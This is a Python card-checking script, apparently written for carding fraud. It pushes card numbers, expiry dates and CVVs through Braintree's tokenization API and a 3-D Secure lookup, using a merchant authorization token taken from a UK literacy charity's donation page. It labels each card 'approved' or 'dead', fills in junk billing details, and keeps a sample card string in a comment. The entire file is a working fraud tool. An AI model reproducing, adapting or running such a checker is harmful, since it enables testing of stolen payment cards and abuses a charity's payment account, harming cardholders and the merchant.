import requests
import time


def process_sum(command_data):
    try:
        # تقسيم النص إلى أجزاء بناءً على الفاصل |
        n = command_data.split('|')[0]
        mm = command_data.split('|')[1]
        yy = int(command_data.split('|')[2])
        cvc = command_data.split('|')[3].replace('\n', '')
        if yy < 100:
            yy = yy + 2000
        headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzY3MDA3MDAsImp0aSI6IjMwZjVhYzA1LTYyMmQtNDEwYS1iYjRhLWNkYzA3MTVhYTBlZiIsInN1YiI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.zEMYER0XfexZxCswaEUMqlm0NSQAY1byL7mbyHTdSu4m9Bg4VBf0nPwkuK4HBFr9H0LkXF9meUyCx-7hzkPPIQ',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',}
        json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': '11428ee5-6fc9-4235-af03-0c9607d8df2a',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',}
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        tok = (response.json()['data']['tokenizeCreditCard']['token'])
        biin = response.json(
        )['data']['tokenizeCreditCard']['creditCard']['bin']
        headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://literacytrust.org.uk',
    'priority': 'u=1, i',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',}
        json_data = {
    'amount': 7,
    'additionalInfo': {
        'acsWindowSize': '03',
        'billingLine1': '321ghfdfghxgf',
        'billingLine2': '',
        'billingPostalCode': '13211',
        'billingCountryCode': 'US',
        'billingGivenName': 'yhdhfgdgf',
        'billingSurname': 'hjfjghfgh',
        'email': 'xinowuli@thetechnext.net',
    },
    'bin': biin,
    'dfReferenceId': '0_c6f7a280-24ea-4c86-a5fd-60cf462031fe',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.99.0',
        'cardinalDeviceDataCollectionTimeElapsed': 42,
        'issuerDeviceDataCollectionTimeElapsed': 5558,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzY3MDA3MDAsImp0aSI6IjMwZjVhYzA1LTYyMmQtNDEwYS1iYjRhLWNkYzA3MTVhYTBlZiIsInN1YiI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.zEMYER0XfexZxCswaEUMqlm0NSQAY1byL7mbyHTdSu4m9Bg4VBf0nPwkuK4HBFr9H0LkXF9meUyCx-7hzkPPIQ',
    'braintreeLibraryVersion': 'braintree/web/3.99.0',
    '_meta': {
        'merchantAppId': 'literacytrust.org.uk',
        'platform': 'web',
        'sdkVersion': '3.99.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '11428ee5-6fc9-4235-af03-0c9607d8df2a',
    },}
        response = requests.post(f'https://api.braintreegateway.com/merchants/458w85bw8sbvhtfc/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',headers=headers,json=json_data,)
        challange = response.json(
        )['paymentMethod']['threeDSecureInfo']['status']
        if "challenge_required" in challange:
            message = "approved"
        else:
            message = "dead"
        time.sleep(1)
        return message
    except Exception as e:
        return f"حدث خطأ: {str(e)}. تأكد من أن الأمر بصيغة صحيحة."


# aa = '371664327181008|02|2033|6846'
# result = process_sum(aa)
# print(result)
